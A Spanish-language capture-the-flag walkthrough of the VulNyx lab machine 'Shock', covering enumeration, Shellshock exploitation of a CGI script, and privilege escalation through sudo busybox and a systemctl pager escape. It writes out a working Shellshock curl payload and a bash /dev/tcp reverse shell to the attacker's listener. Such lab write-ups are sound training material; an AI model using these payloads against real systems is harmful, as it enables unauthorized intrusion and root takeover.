# WriteUp: Shock | VulNyx

Iniciamos realizamos con nmap para el descubrimiento de puertos:

```sh
nmap -n -Pn -sS -p- --min-rate 5000 192.168.56.28

PORT   STATE    SERVICE
21/tcp filtered ftp
22/tcp open     ssh
80/tcp open     http
```

Continuamos realizando otros escaneo con nmap para identificar mayor información de los puertos:

```sh
nmap -sVC -p21,22,80 192.168.56.28 

PORT   STATE  SERVICE VERSION
21/tcp closed ftp
22/tcp open   ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 37:36:60:3e:26:ae:23:3f:e1:8b:5d:18:e7:a7:c7:ce (RSA)
|   256 34:9a:57:60:7d:66:70:d5:b5:ff:47:96:e0:36:23:75 (ECDSA)
|_  256 ae:7d:ee:fe:1d:bc:99:4d:54:45:3d:61:16:f8:6c:87 (ED25519)
80/tcp open   http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
```

Ingresamos a la plataforma web para identificar alguna información adicional, sin embargo solo encontramos un mensaje de "HelloWorld"&#x20;

<figure><img src="../../.gitbook/assets/Pasted image 20250930081804.png" alt=""><figcaption></figcaption></figure>

Realizamos una búsqueda con gobuster, sin embargo tampoco encontramos nada:

```sh
gobuster dir -u http://192.168.56.28 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                        
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.28
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 278]
Progress: 220558 / 220558 (100.00%)
===============================================================
Finished
===============================================================
```

Realicé un par de búsquedas más con otras listas pero no encontré nada más; decidí utilizar los códulos de Metasploit, ya que tienen módulos personalizados de escaneos para http:

```sh
# Utilicé el siguiente módulo
auxiliary/scanner/http/dir_scanner

# Del cual solo tuve que agregar el RHOSTS
msf auxiliary(scanner/http/files_dir) > options 

Module options (auxiliary/scanner/http/files_dir):

   Name        Current Setting                        Required  Description
   ----        ---------------                        --------  -----------
   DICTIONARY  /usr/share/metasploit-framework/data/  no        Path of word dictionary to use
               wmap/wmap_files.txt
   EXT                                                no        Append file extension to use
   PATH        /                                      yes       The path  to identify files
   Proxies                                            no        A proxy chain of format type:host:port[,type:host:port][...]. Suppo
                                                                rted proxies: sapni, socks4, socks5, http, socks5h
   RHOSTS                                             yes       The target host(s), see https://docs.metasploit.com/docs/using-meta
                                                                sploit/basics/using-metasploit.html
   RPORT       80                                     yes       The target port (TCP)
   SSL         false                                  no        Negotiate SSL/TLS for outgoing connections
   THREADS     1                                      yes       The number of concurrent threads (max one per host)
   VHOST                                              no        HTTP server virtual host


View the full module info with the info, or info -d command.

msf auxiliary(scanner/http/files_dir) > set RHOSTS 192.168.56.28
RHOSTS => 192.168.56.28

msf auxiliary(scanner/http/files_dir) > run
```

Luego de ello, obtuve el siguiente resultado:

```sh
[*] Detecting error code
[*] Using code '404' as not found for 192.168.56.28
[+] Found http://192.168.56.28:80/cgi-bin/ 403 (192.168.56.28)
[+] Found http://192.168.56.28:80/icons/ 403 (192.168.56.28)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Tenía entendido que `cgi` estaba relacionado con Apache, pero no sabía nada más al respecto, así que me puse a investigar y encontré que en ese directorio se guardan scripts importante. Existe otro módulo de Metasploit que realiza escaneo de algunas extensiones, decidí usarla para probar suerte:

```sh
msf auxiliary(scanner/http/files_dir) > options 

Module options (auxiliary/scanner/http/files_dir):

   Name        Current Setting                        Required  Description
   ----        ---------------                        --------  -----------
   DICTIONARY  /usr/share/metasploit-framework/data/  no        Path of word dictionary to use
               wmap/wmap_files.txt
   EXT                                                no        Append file extension to use
   PATH        /                                      yes       The path  to identify files
   Proxies                                            no        A proxy chain of format type:host:port[,type:host:port][...]. Suppo
                                                                rted proxies: sapni, socks4, socks5, http, socks5h
   RHOSTS                                             yes       The target host(s), see https://docs.metasploit.com/docs/using-meta
                                                                sploit/basics/using-metasploit.html
   RPORT       80                                     yes       The target port (TCP)
   SSL         false                                  no        Negotiate SSL/TLS for outgoing connections
   THREADS     1                                      yes       The number of concurrent threads (max one per host)
   VHOST                                              no        HTTP server virtual host


View the full module info with the info, or info -d command.

msf auxiliary(scanner/http/files_dir) > set RHOSTS 192.168.56.28
RHOSTS => 192.168.56.28
msf auxiliary(scanner/http/files_dir) > run
[*] Using code '404' as not found for files with extension .null
[*] Using code '404' as not found for files with extension .backup
[*] Using code '404' as not found for files with extension .bak
[*] Using code '404' as not found for files with extension .c
[*] Using code '404' as not found for files with extension .cfg
[*] Using code '404' as not found for files with extension .class
[*] Using code '404' as not found for files with extension .copy
[*] Using code '404' as not found for files with extension .conf
[*] Using code '404' as not found for files with extension .exe
[*] Using code '404' as not found for files with extension .html
[+] Found http://192.168.56.28:80/index.html 200
[*] Using code '404' as not found for files with extension .htm
[*] Using code '404' as not found for files with extension .ini
[*] Using code '404' as not found for files with extension .log
[*] Using code '404' as not found for files with extension .old
[*] Using code '404' as not found for files with extension .orig
[*] Using code '404' as not found for files with extension .php
[*] Using code '404' as not found for files with extension .tar
[*] Using code '404' as not found for files with extension .tar.gz
[*] Using code '404' as not found for files with extension .tgz
[*] Using code '404' as not found for files with extension .tmp
[*] Using code '404' as not found for files with extension .temp
[*] Using code '404' as not found for files with extension .txt
[*] Using code '404' as not found for files with extension .zip
[*] Using code '404' as not found for files with extension ~
[*] Using code '404' as not found for files with extension 
[*] Using code '404' as not found for files with extension 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Como se puede ver, no se encontró nada relevante. Busqué información de los tipos de script que se guardaban en ese directorio y encontré estos `.cgi,.sh,.pl,.py`.

Mi intención era hacer un ataque de fuerza bruta, sin embargo ya había usado varias listas de gobuster sin éxito, por lo que empecé a buscar información sobre alguna lista en particular que me ayude en esta búsqueda:

```sh
gobuster dir -u http://192.168.56.28/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x .cgi,.sh,.pl,.py -k -t 50
```

En mis escaneos anteriores no quise usar esa lista por ser pequeña, sin embargo, me di con la sorpresa de que tenía los nombres que necesitaba:

```
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.28/cgi-bin/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              py,cgi,sh,pl
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.cgi        (Status: 403) [Size: 278]
/.htpasswd.pl         (Status: 403) [Size: 278]
/.htpasswd.sh         (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess.py         (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/.htaccess.sh         (Status: 403) [Size: 278]
/.hta.pl              (Status: 403) [Size: 278]
/.hta.py              (Status: 403) [Size: 278]
/.hta.cgi             (Status: 403) [Size: 278]
/.hta.sh              (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htaccess.pl         (Status: 403) [Size: 278]
/.htpasswd.cgi        (Status: 403) [Size: 278]
/.htpasswd.py         (Status: 403) [Size: 278]
/shell.sh             (Status: 500) [Size: 611]
Progress: 23065 / 23065 (100.00%)
===============================================================
Finished
===============================================================
```

Como podemos ver, tenemos un archivo `/shell.sh` con un código 500 el cual es una respuesta genérica que señala una falla en el servidor, como errores de programación, configuración incorrecta de archivos, recursos insuficientes o problemas en la base de datos, y el servidor no puede especificar la causa exacta del problema.

Entonces si un script `.sh` se encuentra mal configurado, es muy seguro que podamos explotar ese error. Buscando más información encontré que esta es una vulnerabilidad y que se llama Shellshock y la podemos explotar de la siguiente manera:

```sh
curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'id'" http://192.168.56.28/cgi-bin/shell.sh

# Obtenemos la siguiente respuesta:
uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Los cual es evidencia de que pudimos ejecutar el comando id
```

Ahora lo que tenemos que realizar es ejecutar una reverse shell:

```sh
# En una terminal de nestro kali ejecutamos
nc -lvnp 4444

# Y en otro terminal
curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.56.22/4444 0>&1'" http://192.168.56.28/cgi-bin/shell.sh

# En nuestro kali obtendremos
bash: cannot set terminal process group (496): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.3$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Bien, en este punto busqué permisos de ejecución:

```sh
bash-4.3$ sudo -l
sudo -l
Matching Defaults entries for www-data on shock:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on shock:
    (will) NOPASSWD: /usr/bin/busybox
```

Ahora que ya sé que puedo ejecutar este comando con otro usuario, hacemos lo siguiente:

```sh
bash-4.3$ sudo -u will /usr/bin/busybox sh

# Esto no nos mostrará nada en pantalla, por lo que escribimos id nos mostrará:
id
uid=1001(will) gid=1001(will) groups=1001(will)

# Como podemo identificar, ahora somo el usuario will, sin embargo no tenemos una shell interactiva, escribimos:
bash -i
```

Luego de ello, identificamos permisos de ejecución

```sh
sudo -l

# Respuesta
Matching Defaults entries for will on shock:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User will may run the following commands on shock:
    (root) NOPASSWD: /usr/bin/systemctl
```

Luego de ello, como ya identificamos un comando que podemos ejecutar como root y sin contraseña, ejecutamos:

```sh
will@shock:$ sudo -u root /usr/bin/systemctl
!/bin/bash
```

Cuando ejecutamos `sudo systemctl`, la utilidad `systemctl` nos permite controlar los servicios del sistema. Sin embargo, no siempre es una simple llamada a la shell. En algunas configuraciones o versiones, `systemctl` invoca un **paginador** (como `less` o `more`) para mostrar la salida de los servicios.

Los paginadores tienen sus propias funciones y comandos. El carácter `!` es un comando especial en estos paginadores que nos permite ejecutar un comando de shell. Es una forma de "escapar" del paginador y regresar a la línea de comandos.

```
# Y obtenemos lo siguiente:
root@shock:# id
id
uid=0(root) gid=0(root) groups=0(root)
```

7u7!!! Listo, máquina terminada 7u7!!!!
